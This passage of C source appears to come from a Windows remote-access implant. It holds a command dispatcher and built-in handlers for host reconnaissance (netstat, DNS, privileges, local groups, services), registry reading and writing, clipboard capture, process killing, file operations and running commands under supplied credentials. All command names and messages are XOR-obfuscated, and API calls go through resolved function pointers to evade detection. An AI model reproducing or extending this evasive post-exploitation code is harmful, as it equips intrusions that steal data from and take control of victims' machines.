                    lip[0], lip[1], lip[2], lip[3], fnHtons((WORD)row->dwLocalPort));
                _snprintf(remote, sizeof(remote) - 1, _naf,
                    rip[0], rip[1], rip[2], rip[3], fnHtons((WORD)row->dwRemotePort));
                tcp_state_str(row->dwState, state, sizeof(state));
                n = _snprintf(out + pos, size - pos - 1, _ntf,
                    local, remote, state, (unsigned long)row->dwOwningPid);
                if (n > 0 && pos + n < size - 1) pos += n;
            }
        }
        fnLocalFree(tcp_tbl);
    }

    /* UDP */
    DWORD udp_sz = 0;
    fnGetExtendedUdpTable(NULL, &udp_sz, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0);
    MIB_UDPTABLE_OWNER_PID *udp_tbl = (MIB_UDPTABLE_OWNER_PID *)fnLocalAlloc(LPTR, udp_sz);
    if (udp_tbl) {
        if (fnGetExtendedUdpTable(udp_tbl, &udp_sz, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0) == NO_ERROR) {
            for (DWORD i = 0; i < udp_tbl->dwNumEntries; i++) {
                MIB_UDPROW_OWNER_PID *row = &udp_tbl->table[i];
                unsigned char *lip = (unsigned char *)&row->dwLocalAddr;
                char local[32];
                char _naf2[ENC_NETSTAT_ADDR_FMT_LEN + 1]; xor_dec(_naf2, ENC_NETSTAT_ADDR_FMT, ENC_NETSTAT_ADDR_FMT_LEN);
                _snprintf(local, sizeof(local) - 1, _naf2,
                    lip[0], lip[1], lip[2], lip[3], fnHtons((WORD)row->dwLocalPort));
                n = _snprintf(out + pos, size - pos - 1, _nuf, local, _nus);
                if (n > 0 && pos + n < size - 1) pos += n;
            }
        }
        fnLocalFree(udp_tbl);
    }
    out[pos] = '\0';
}

/* ------------------------------------------------------------------ */
/* dns                                                                  */
/* ------------------------------------------------------------------ */
static void builtin_dns(const char *name, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!name || name[0] == '\0') {
        char _dm[ENC_DNS_ERR_MISSING_LEN + 1]; xor_dec(_dm, ENC_DNS_ERR_MISSING, ENC_DNS_ERR_MISSING_LEN);
        _snprintf(out, size - 1, "%s", _dm); return;
    }
    DNS_RECORD *records = NULL;
    DNS_STATUS st = fnDnsQuery_A(name, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &records, NULL);
    if (st != 0) {
        char _dq[ENC_DNS_ERR_QUERY_LEN + 1]; xor_dec(_dq, ENC_DNS_ERR_QUERY, ENC_DNS_ERR_QUERY_LEN);
        _snprintf(out, size - 1, _dq, (long)st); return;
    }
    char _daf[ENC_DNS_AREC_FMT_LEN + 1]; xor_dec(_daf, ENC_DNS_AREC_FMT, ENC_DNS_AREC_FMT_LEN);
    int pos = 0;
    for (DNS_RECORD *r = records; r; r = r->pNext) {
        if (r->wType == DNS_TYPE_A) {
            unsigned char *ip = (unsigned char *)&r->Data.A.IpAddress;
            int n = _snprintf(out + pos, size - pos - 1, _daf, ip[0], ip[1], ip[2], ip[3]);
            if (n > 0 && pos + n < size - 1) pos += n;
        }
    }
    if (pos == 0) {
        char _dnr[ENC_DNS_NO_RECORDS_LEN + 1]; xor_dec(_dnr, ENC_DNS_NO_RECORDS, ENC_DNS_NO_RECORDS_LEN);
        _snprintf(out, size - 1, "%s", _dnr);
    }
    else out[pos] = '\0';
    fnDnsRecordListFree(records, DnsFreeRecordList);
}

/* ------------------------------------------------------------------ */
/* privs                                                                */
/* ------------------------------------------------------------------ */
static void builtin_privs(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    HANDLE hToken = NULL;
    if (!fnOpenProcessToken(fnGetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        char _pre[ENC_PRIVS_ERR_LEN + 1]; xor_dec(_pre, ENC_PRIVS_ERR, ENC_PRIVS_ERR_LEN);
        _snprintf(out, size - 1, _pre, fnGetLastError()); return;
    }
    DWORD sz = 0;
    fnGetTokenInformation(hToken, TokenPrivileges, NULL, 0, &sz);
    TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)fnLocalAlloc(LPTR, sz);
    if (!tp) {
        fnCloseHandle2(hToken);
        char _pra[ENC_PRIVS_ERR_ALLOC_LEN + 1]; xor_dec(_pra, ENC_PRIVS_ERR_ALLOC, ENC_PRIVS_ERR_ALLOC_LEN);
        _snprintf(out, size - 1, "%s", _pra); return;
    }
    if (!fnGetTokenInformation(hToken, TokenPrivileges, tp, sz, &sz)) {
        fnLocalFree(tp); fnCloseHandle2(hToken);
        char _prg[ENC_PRIVS_ERR_GETTOKEN_LEN + 1]; xor_dec(_prg, ENC_PRIVS_ERR_GETTOKEN, ENC_PRIVS_ERR_GETTOKEN_LEN);
        _snprintf(out, size - 1, _prg, fnGetLastError()); return;
    }
    char _ped[ENC_PRIVS_ENABLED_DEF_LEN + 1]; xor_dec(_ped, ENC_PRIVS_ENABLED_DEF, ENC_PRIVS_ENABLED_DEF_LEN);
    char _pen[ENC_PRIVS_ENABLED_LEN + 1];     xor_dec(_pen, ENC_PRIVS_ENABLED,     ENC_PRIVS_ENABLED_LEN);
    char _pdf[ENC_PRIVS_DEFAULT_LEN + 1];     xor_dec(_pdf, ENC_PRIVS_DEFAULT,     ENC_PRIVS_DEFAULT_LEN);
    char _pdi[ENC_PRIVS_DISABLED_LEN + 1];    xor_dec(_pdi, ENC_PRIVS_DISABLED,    ENC_PRIVS_DISABLED_LEN);
    char _prf[ENC_PRIVS_ROW_FMT_LEN + 1];     xor_dec(_prf, ENC_PRIVS_ROW_FMT,     ENC_PRIVS_ROW_FMT_LEN);
    int pos = 0;
    for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
        char name[256] = {0};
        DWORD name_sz = sizeof(name) - 1;
        fnLookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &name_sz);
        DWORD attr = tp->Privileges[i].Attributes;
        const char *status;
        if ((attr & SE_PRIVILEGE_ENABLED) && (attr & SE_PRIVILEGE_ENABLED_BY_DEFAULT))
            status = _ped;
        else if (attr & SE_PRIVILEGE_ENABLED)
            status = _pen;
        else if (attr & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
            status = _pdf;
        else
            status = _pdi;
        int n = _snprintf(out + pos, size - pos - 1, _prf, name, status);
        if (n > 0 && pos + n < size - 1) pos += n;
    }
    out[pos] = '\0';
    fnLocalFree(tp);
    fnCloseHandle2(hToken);
}

/* ------------------------------------------------------------------ */
/* groups                                                               */
/* ------------------------------------------------------------------ */
static void builtin_groups(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    char username[256] = {0};
    DWORD usz = sizeof(username) - 1;
    if (!fnGetUserNameA(username, &usz)) {
        char _geu[ENC_GROUPS_ERR_USERNAME_LEN + 1]; xor_dec(_geu, ENC_GROUPS_ERR_USERNAME, ENC_GROUPS_ERR_USERNAME_LEN);
        _snprintf(out, size - 1, _geu, fnGetLastError()); return;
    }
    WCHAR username_w[256] = {0};
    fnMultiByteToWideChar(CP_ACP, 0, username, -1, username_w, 255);

    LOCALGROUP_USERS_INFO_0 *groups = NULL;
    DWORD entries = 0, total = 0;
    NET_API_STATUS st = fnNetUserGetLocalGroups(NULL, username_w, 0, LG_INCLUDE_INDIRECT,
        (LPBYTE *)&groups, MAX_PREFERRED_LENGTH, &entries, &total);
    if (st != NERR_Success) {
        char _gen[ENC_GROUPS_ERR_NETAPI_LEN + 1]; xor_dec(_gen, ENC_GROUPS_ERR_NETAPI, ENC_GROUPS_ERR_NETAPI_LEN);
        _snprintf(out, size - 1, _gen, (unsigned long)st); return;
    }
    char _grf[ENC_GROUPS_ROW_FMT_LEN + 1]; xor_dec(_grf, ENC_GROUPS_ROW_FMT, ENC_GROUPS_ROW_FMT_LEN);
    int pos = 0;
    for (DWORD i = 0; i < entries; i++) {
        char gname[256] = {0};
        fnWideCharToMultiByte(CP_ACP, 0, groups[i].lgrui0_name, -1, gname, sizeof(gname) - 1, NULL, NULL);
        int n = _snprintf(out + pos, size - pos - 1, _grf, gname);
        if (n > 0 && pos + n < size - 1) pos += n;
    }
    out[pos] = '\0';
    fnNetApiBufferFree(groups);
}

/* ------------------------------------------------------------------ */
/* services                                                             */
/* ------------------------------------------------------------------ */
static void builtin_services(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    SC_HANDLE scm = fnOpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) {
        char _sescm[ENC_SERVICES_ERR_SCM_LEN + 1]; xor_dec(_sescm, ENC_SERVICES_ERR_SCM, ENC_SERVICES_ERR_SCM_LEN);
        _snprintf(out, size - 1, _sescm, fnGetLastError()); return;
    }
    DWORD bytes_needed = 0, returned = 0, resume = 0;
    fnEnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
        NULL, 0, &bytes_needed, &returned, &resume, NULL);
    BYTE *buf = (BYTE *)fnLocalAlloc(LPTR, bytes_needed);
    if (!buf) {
        fnCloseServiceHandle(scm);
        char _sea[ENC_SERVICES_ERR_ALLOC_LEN + 1]; xor_dec(_sea, ENC_SERVICES_ERR_ALLOC, ENC_SERVICES_ERR_ALLOC_LEN);
        _snprintf(out, size - 1, "%s", _sea); return;
    }
    resume = 0;
    fnEnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
        buf, bytes_needed, &bytes_needed, &returned, &resume, NULL);
    ENUM_SERVICE_STATUS_PROCESS *svc = (ENUM_SERVICE_STATUS_PROCESS *)buf;
    char _srun[ENC_SERVICES_RUNNING_LEN + 1];  xor_dec(_srun, ENC_SERVICES_RUNNING,  ENC_SERVICES_RUNNING_LEN);
    char _sstp[ENC_SERVICES_STOPPED_LEN + 1];  xor_dec(_sstp, ENC_SERVICES_STOPPED,  ENC_SERVICES_STOPPED_LEN);
    char _soth[ENC_SERVICES_OTHER_ST_LEN + 1]; xor_dec(_soth, ENC_SERVICES_OTHER_ST, ENC_SERVICES_OTHER_ST_LEN);
    char _srf[ENC_SERVICES_ROW_FMT_LEN + 1];   xor_dec(_srf,  ENC_SERVICES_ROW_FMT,  ENC_SERVICES_ROW_FMT_LEN);
    int pos = 0;
    for (DWORD i = 0; i < returned; i++) {
        DWORD st = svc[i].ServiceStatusProcess.dwCurrentState;
        const char *state = (st == SERVICE_RUNNING) ? _srun :
                            (st == SERVICE_STOPPED)  ? _sstp : _soth;
        int n = _snprintf(out + pos, size - pos - 1, _srf,
            svc[i].lpServiceName, state,
            (unsigned long)svc[i].ServiceStatusProcess.dwProcessId);
        if (n > 0 && pos + n < size - 1) pos += n;
    }
    out[pos] = '\0';
    fnLocalFree(buf);
    fnCloseServiceHandle(scm);
}

/* ------------------------------------------------------------------ */
/* reg helpers                                                          */
/* ------------------------------------------------------------------ */
static HKEY parse_reg_path(const char *path, const char **subkey_out) {
    if (xor_prefix(path, ENC_REG_HIVE_HKLM, ENC_REG_HIVE_HKLM_LEN)) { *subkey_out = path + ENC_REG_HIVE_HKLM_LEN; return HKEY_LOCAL_MACHINE; }
    if (xor_prefix(path, ENC_REG_HIVE_HKCU, ENC_REG_HIVE_HKCU_LEN)) { *subkey_out = path + ENC_REG_HIVE_HKCU_LEN; return HKEY_CURRENT_USER; }
    if (xor_prefix(path, ENC_REG_HIVE_HKCR, ENC_REG_HIVE_HKCR_LEN)) { *subkey_out = path + ENC_REG_HIVE_HKCR_LEN; return HKEY_CLASSES_ROOT; }
    if (xor_prefix(path, ENC_REG_HIVE_HKU,  ENC_REG_HIVE_HKU_LEN))  { *subkey_out = path + ENC_REG_HIVE_HKU_LEN;  return HKEY_USERS; }
    *subkey_out = path; return NULL;
}

/* ------------------------------------------------------------------ */
/* reg_query                                                            */
/* ------------------------------------------------------------------ */
static void builtin_reg_query(const char *args, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!args || args[0] == '\0') return;
    char key_path[512], value_name[256];
    if (!split_two_args(args, key_path, sizeof(key_path), value_name, sizeof(value_name))) return;

    const char *subkey = NULL;
    HKEY hive = parse_reg_path(key_path, &subkey);
    if (!hive) {
        char _rqh[ENC_REG_QUERY_ERR_HIVE_LEN + 1]; xor_dec(_rqh, ENC_REG_QUERY_ERR_HIVE, ENC_REG_QUERY_ERR_HIVE_LEN);
        _snprintf(out, size - 1, "%s", _rqh); return;
    }
    HKEY hk = NULL;
    if (fnRegOpenKeyExA(hive, subkey, 0, KEY_READ, &hk) != ERROR_SUCCESS) {
        char _rqo[ENC_REG_QUERY_ERR_OPEN_LEN + 1]; xor_dec(_rqo, ENC_REG_QUERY_ERR_OPEN, ENC_REG_QUERY_ERR_OPEN_LEN);
        _snprintf(out, size - 1, _rqo, fnGetLastError()); return;
    }
    BYTE data[1024] = {0};
    DWORD data_sz = sizeof(data) - 1, type = 0;
    LONG r = fnRegQueryValueExA(hk, value_name, NULL, &type, data, &data_sz);
    fnRegCloseKey(hk);
    if (r != ERROR_SUCCESS) {
        char _rqnf[ENC_REG_QUERY_ERR_NOTFOUND_LEN + 1]; xor_dec(_rqnf, ENC_REG_QUERY_ERR_NOTFOUND, ENC_REG_QUERY_ERR_NOTFOUND_LEN);
        _snprintf(out, size - 1, _rqnf, (long)r); return;
    }
    if (type == REG_SZ || type == REG_EXPAND_SZ) {
        char _rsz[ENC_REG_FMT_SZ_LEN + 1]; xor_dec(_rsz, ENC_REG_FMT_SZ, ENC_REG_FMT_SZ_LEN);
        _snprintf(out, size - 1, _rsz, (char *)data);
    } else if (type == REG_DWORD) {
        DWORD dw = *(DWORD *)data;
        char _rdw[ENC_REG_FMT_DWORD_LEN + 1]; xor_dec(_rdw, ENC_REG_FMT_DWORD, ENC_REG_FMT_DWORD_LEN);
        _snprintf(out, size - 1, _rdw, (unsigned long)dw, (unsigned long)dw);
    } else {
        int pos = 0;
        char _rhx[ENC_REG_FMT_HEX_LEN + 1]; xor_dec(_rhx, ENC_REG_FMT_HEX, ENC_REG_FMT_HEX_LEN);
        for (DWORD i = 0; i < data_sz; i++) {
            int n = _snprintf(out + pos, size - pos - 1, _rhx, data[i]);
            if (n > 0 && pos + n < size - 1) pos += n;
        }
        if (pos > 0) { out[pos++] = '\r'; out[pos++] = '\n'; }
        out[pos] = '\0';
    }
}

/* ------------------------------------------------------------------ */
/* reg_set                                                              */
/* ------------------------------------------------------------------ */
static void builtin_reg_set(const char *args, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!args || args[0] == '\0') return;
    char key_path[512], rest[1024];
    if (!split_two_args(args, key_path, sizeof(key_path), rest, sizeof(rest))) return;
    char value_name[256], data_str[512];
    if (!split_two_args(rest, value_name, sizeof(value_name), data_str, sizeof(data_str))) {
        char _rsf[ENC_REG_SET_ERR_FAIL_LEN + 1]; xor_dec(_rsf, ENC_REG_SET_ERR_FAIL, ENC_REG_SET_ERR_FAIL_LEN);
        _snprintf(out, size - 1, "%s", _rsf); return;
    }
    const char *subkey = NULL;
    HKEY hive = parse_reg_path(key_path, &subkey);
    if (!hive) {
        char _rsh[ENC_REG_SET_ERR_HIVE_LEN + 1]; xor_dec(_rsh, ENC_REG_SET_ERR_HIVE, ENC_REG_SET_ERR_HIVE_LEN);
        _snprintf(out, size - 1, "%s", _rsh); return;
    }
    HKEY hk = NULL;
    if (fnRegOpenKeyExA(hive, subkey, 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) {
        char _rso[ENC_REG_SET_ERR_OPEN_LEN + 1]; xor_dec(_rso, ENC_REG_SET_ERR_OPEN, ENC_REG_SET_ERR_OPEN_LEN);
        _snprintf(out, size - 1, _rso, fnGetLastError()); return;
    }
    LONG r = fnRegSetValueExA(hk, value_name, 0, REG_SZ,
        (BYTE *)data_str, (DWORD)(strlen(data_str) + 1));
    fnRegCloseKey(hk);
    if (r != ERROR_SUCCESS) {
        char _rsf[ENC_REG_SET_ERR_FAIL_LEN + 1]; xor_dec(_rsf, ENC_REG_SET_ERR_FAIL, ENC_REG_SET_ERR_FAIL_LEN);
        _snprintf(out, size - 1, _rsf, (long)r);
    } else {
        char _rsok[ENC_REG_SET_OK_LEN + 1]; xor_dec(_rsok, ENC_REG_SET_OK, ENC_REG_SET_OK_LEN);
        _snprintf(out, size - 1, "%s", _rsok);
    }
}

/* ------------------------------------------------------------------ */
/* clipboard                                                            */
/* ------------------------------------------------------------------ */
static void builtin_clipboard(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!fnOpenClipboard(NULL)) {
        char _co[ENC_CLIPBOARD_ERR_OPEN_LEN + 1]; xor_dec(_co, ENC_CLIPBOARD_ERR_OPEN, ENC_CLIPBOARD_ERR_OPEN_LEN);
        _snprintf(out, size - 1, _co, fnGetLastError()); return;
    }
    HANDLE h = fnGetClipboardData(CF_TEXT);
    if (!h) {
        fnCloseClipboard();
        char _ce[ENC_CLIPBOARD_EMPTY_LEN + 1]; xor_dec(_ce, ENC_CLIPBOARD_EMPTY, ENC_CLIPBOARD_EMPTY_LEN);
        _snprintf(out, size - 1, "%s", _ce); return;
    }
    char *text = (char *)fnGlobalLock(h);
    if (text) {
        _snprintf(out, size - 1, "%s", text);
        fnGlobalUnlock(h);
    } else {
        char _cl[ENC_CLIPBOARD_ERR_LOCK_LEN + 1]; xor_dec(_cl, ENC_CLIPBOARD_ERR_LOCK, ENC_CLIPBOARD_ERR_LOCK_LEN);
        _snprintf(out, size - 1, "%s", _cl);
    }
    fnCloseClipboard();
}

/* ------------------------------------------------------------------ */
/* runas                                                                */
/* ------------------------------------------------------------------ */
static void builtin_runas(const char *args, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!args || args[0] == '\0') return;
    char user[256], rest[1024];
    if (!split_two_args(args, user, sizeof(user), rest, sizeof(rest))) return;
    char pass[256], cmd_str[512];
    if (!split_two_args(rest, pass, sizeof(pass), cmd_str, sizeof(cmd_str))) return;
    WCHAR user_w[256] = {0}, pass_w[256] = {0}, cmd_w[512] = {0};
    fnMultiByteToWideChar(CP_ACP, 0, user,    -1, user_w, 255);
    fnMultiByteToWideChar(CP_ACP, 0, pass,    -1, pass_w, 255);
    fnMultiByteToWideChar(CP_ACP, 0, cmd_str, -1, cmd_w,  511);
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!fnCreateProcessWithLogonW(user_w, NULL, pass_w, LOGON_WITH_PROFILE,
            NULL, cmd_w, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        char _rf[ENC_RUNAS_ERR_FAIL_LEN + 1]; xor_dec(_rf, ENC_RUNAS_ERR_FAIL, ENC_RUNAS_ERR_FAIL_LEN);
        _snprintf(out, size - 1, _rf, fnGetLastError()); return;
    }
    DWORD wait_ret = fnWaitForSingleObject(pi.hProcess, 30000);
    DWORD exit_code = 0;
    if (wait_ret == WAIT_OBJECT_0)
        fnGetExitCodeProcess(pi.hProcess, &exit_code);
    char _pef[ENC_FMT_PID_EXIT_LEN + 1]; xor_dec(_pef, ENC_FMT_PID_EXIT, ENC_FMT_PID_EXIT_LEN);
    _snprintf(out, size - 1, _pef,
              (unsigned long)pi.dwProcessId, (unsigned long)exit_code);
    fnCloseHandle2(pi.hProcess);
    fnCloseHandle2(pi.hThread);
}

/* ------------------------------------------------------------------ */
/* uptime                                                               */
/* ------------------------------------------------------------------ */
static void builtin_uptime(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    ULONGLONG ms   = fnGetTickCount64();
    ULONGLONG secs = ms / 1000;
    ULONGLONG days  = secs / 86400;
    ULONGLONG hours = (secs % 86400) / 3600;
    ULONGLONG mins  = (secs % 3600) / 60;
    ULONGLONG s     = secs % 60;
    char _fmt[ENC_UPTIME_FMT_LEN + 1]; xor_dec(_fmt, ENC_UPTIME_FMT, ENC_UPTIME_FMT_LEN);
    _snprintf(out, size - 1, _fmt, days, hours, mins, s);
}

/* ------------------------------------------------------------------ */
/* dispatcher                                                           */
/* ------------------------------------------------------------------ */
int builtin_dispatch(const char *cmd, char *out_buf, int buf_size) {
    if (buf_size > 0) out_buf[buf_size - 1] = '\0';
    out_buf[0] = '\0';

    if (xor_eq(cmd, ENC_CMD_WHOAMI, ENC_CMD_WHOAMI_LEN)) {
        DWORD sz = (DWORD)(buf_size - 1);
        if (!fnGetUserNameA(out_buf, &sz)) {
            char _we[ENC_WHOAMI_ERR_LEN + 1]; xor_dec(_we, ENC_WHOAMI_ERR, ENC_WHOAMI_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _we, fnGetLastError());
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_HOSTNAME, ENC_CMD_HOSTNAME_LEN)) {
        DWORD sz = (DWORD)(buf_size - 1);
        if (!fnGetComputerNameA(out_buf, &sz)) {
            char _he[ENC_HOSTNAME_ERR_LEN + 1]; xor_dec(_he, ENC_HOSTNAME_ERR, ENC_HOSTNAME_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _he, fnGetLastError());
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_DOMAIN, ENC_CMD_DOMAIN_LEN)) {
        DWORD sz = (DWORD)(buf_size - 1);
        if (!fnGetComputerNameExA(ComputerNameDnsDomain, out_buf, &sz) || out_buf[0] == '\0') {
            char _dn[ENC_DOMAIN_NOT_JOINED_LEN + 1]; xor_dec(_dn, ENC_DOMAIN_NOT_JOINED, ENC_DOMAIN_NOT_JOINED_LEN);
            _snprintf(out_buf, buf_size - 1, "%s", _dn);
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_GETPID, ENC_CMD_GETPID_LEN)) {
        char _pf[ENC_GETPID_FMT_LEN + 1]; xor_dec(_pf, ENC_GETPID_FMT, ENC_GETPID_FMT_LEN);
        _snprintf(out_buf, buf_size - 1, _pf, (unsigned long)fnGetCurrentProcessId());
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_GETINTEGRITY, ENC_CMD_GETINTEGRITY_LEN)) {
        builtin_getintegrity(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_SYSINFO, ENC_CMD_SYSINFO_LEN)) {
        builtin_sysinfo(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_DRIVES, ENC_CMD_DRIVES_LEN)) {
        builtin_drives(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_ENV, ENC_CMD_ENV_LEN)) {
        builtin_env(out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_GETENV, ENC_CMD_GETENV_LEN)) {
        DWORD sz = (DWORD)(buf_size - 1);
        if (!fnGetEnvironmentVariableA(cmd + ENC_CMD_GETENV_LEN, out_buf, sz)) {
            char _ge[ENC_GETENV_ERR_LEN + 1]; xor_dec(_ge, ENC_GETENV_ERR, ENC_GETENV_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _ge, cmd + ENC_CMD_GETENV_LEN);
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_PWD, ENC_CMD_PWD_LEN)) {
        if (!fnGetCurrentDirectoryA(buf_size - 1, out_buf)) {
            char _pe[ENC_PWD_ERR_LEN + 1]; xor_dec(_pe, ENC_PWD_ERR, ENC_PWD_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _pe, fnGetLastError());
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_CD, ENC_CMD_CD_LEN) ||
        xor_prefix(cmd, ENC_CMD_CD_SP, ENC_CMD_CD_SP_LEN)) {
        builtin_cd(xor_prefix(cmd, ENC_CMD_CD_SP, ENC_CMD_CD_SP_LEN)
                   ? cmd + ENC_CMD_CD_SP_LEN : "", out_buf, buf_size);
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_LS, ENC_CMD_LS_LEN)   || xor_prefix(cmd, ENC_CMD_LS_SP,  ENC_CMD_LS_SP_LEN) ||
        xor_eq(cmd, ENC_CMD_DIR, ENC_CMD_DIR_LEN)  || xor_prefix(cmd, ENC_CMD_DIR_SP, ENC_CMD_DIR_SP_LEN)) {
        const char *arg = "";
        if      (xor_prefix(cmd, ENC_CMD_LS_SP,  ENC_CMD_LS_SP_LEN))  arg = cmd + ENC_CMD_LS_SP_LEN;
        else if (xor_prefix(cmd, ENC_CMD_DIR_SP, ENC_CMD_DIR_SP_LEN)) arg = cmd + ENC_CMD_DIR_SP_LEN;
        builtin_ls(arg, out_buf, buf_size);
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CAT, ENC_CMD_CAT_LEN)) {
        builtin_cat(cmd + ENC_CMD_CAT_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_STAT, ENC_CMD_STAT_LEN)) {
        builtin_stat(cmd + ENC_CMD_STAT_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_MKDIR, ENC_CMD_MKDIR_LEN)) {
        if (!fnCreateDirectoryA(cmd + ENC_CMD_MKDIR_LEN, NULL)) {
            char _me[ENC_MKDIR_ERR_LEN + 1]; xor_dec(_me, ENC_MKDIR_ERR, ENC_MKDIR_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _me, fnGetLastError());
        }
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_RMDIR, ENC_CMD_RMDIR_LEN)) {
        if (!fnRemoveDirectoryA(cmd + ENC_CMD_RMDIR_LEN)) {
            char _rde[ENC_RMDIR_ERR_LEN + 1]; xor_dec(_rde, ENC_RMDIR_ERR, ENC_RMDIR_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _rde, fnGetLastError());
        }
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_RM, ENC_CMD_RM_LEN)) {
        if (!fnDeleteFileA(cmd + ENC_CMD_RM_LEN)) {
            char _rme[ENC_RM_ERR_LEN + 1]; xor_dec(_rme, ENC_RM_ERR, ENC_RM_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _rme, fnGetLastError());
        }
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_CP, ENC_CMD_CP_LEN)) {
        char src[MAX_PATH], dst[MAX_PATH];
        if (split_two_args(cmd + ENC_CMD_CP_LEN, src, sizeof(src), dst, sizeof(dst)) &&
            !fnCopyFileA(src, dst, FALSE)) {
            char _cpe[ENC_CP_ERR_LEN + 1]; xor_dec(_cpe, ENC_CP_ERR, ENC_CP_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _cpe, fnGetLastError());
        }
        return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_MV, ENC_CMD_MV_LEN)) {
        char src[MAX_PATH], dst[MAX_PATH];
        if (split_two_args(cmd + ENC_CMD_MV_LEN, src, sizeof(src), dst, sizeof(dst)) &&
            !fnMoveFileA(src, dst)) {
            char _mve[ENC_MV_ERR_LEN + 1]; xor_dec(_mve, ENC_MV_ERR, ENC_MV_ERR_LEN);
            _snprintf(out_buf, buf_size - 1, _mve, fnGetLastError());
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_PS, ENC_CMD_PS_LEN)) {
        builtin_ps(out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_KILL, ENC_CMD_KILL_LEN)) {
        DWORD pid = (DWORD)strtoul(cmd + ENC_CMD_KILL_LEN, NULL, 10);
        if (pid != 0) {
            HANDLE h = fnOpenProcess2(PROCESS_TERMINATE, FALSE, pid);
            if (!h) {
                char _ko[ENC_KILL_ERR_OPEN_LEN + 1]; xor_dec(_ko, ENC_KILL_ERR_OPEN, ENC_KILL_ERR_OPEN_LEN);
                _snprintf(out_buf, buf_size - 1, _ko,
                          (unsigned long)pid, fnGetLastError());
            } else {
                fnTerminateProcess(h, 1);
                fnCloseHandle2(h);
            }
        }
        return 1;
    }
    if (xor_eq(cmd, ENC_CMD_IPCONFIG, ENC_CMD_IPCONFIG_LEN)) {
        builtin_ipconfig(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_ARP, ENC_CMD_ARP_LEN)) {
        builtin_arp(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_NETSTAT, ENC_CMD_NETSTAT_LEN)) {
        builtin_netstat(out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_DNS, ENC_CMD_DNS_LEN)) {
        builtin_dns(cmd + ENC_CMD_DNS_LEN, out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_PRIVS, ENC_CMD_PRIVS_LEN)) {
        builtin_privs(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_GROUPS, ENC_CMD_GROUPS_LEN)) {
        builtin_groups(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_SERVICES, ENC_CMD_SERVICES_LEN)) {
        builtin_services(out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_UPTIME, ENC_CMD_UPTIME_LEN)) {
        builtin_uptime(out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_REG_QUERY, ENC_CMD_REG_QUERY_LEN)) {
        builtin_reg_query(cmd + ENC_CMD_REG_QUERY_LEN, out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_REG_SET, ENC_CMD_REG_SET_LEN)) {
        builtin_reg_set(cmd + ENC_CMD_REG_SET_LEN, out_buf, buf_size); return 1;
    }
    if (xor_eq(cmd, ENC_CMD_CLIPBOARD, ENC_CMD_CLIPBOARD_LEN)) {
        builtin_clipboard(out_buf, buf_size); return 1;
    }
    if (xor_prefix(cmd, ENC_CMD_RUNAS, ENC_CMD_RUNAS_LEN)) {
        builtin_runas(cmd + ENC_CMD_RUNAS_LEN, out_buf, buf_size); return 1;
    }

    return 0;
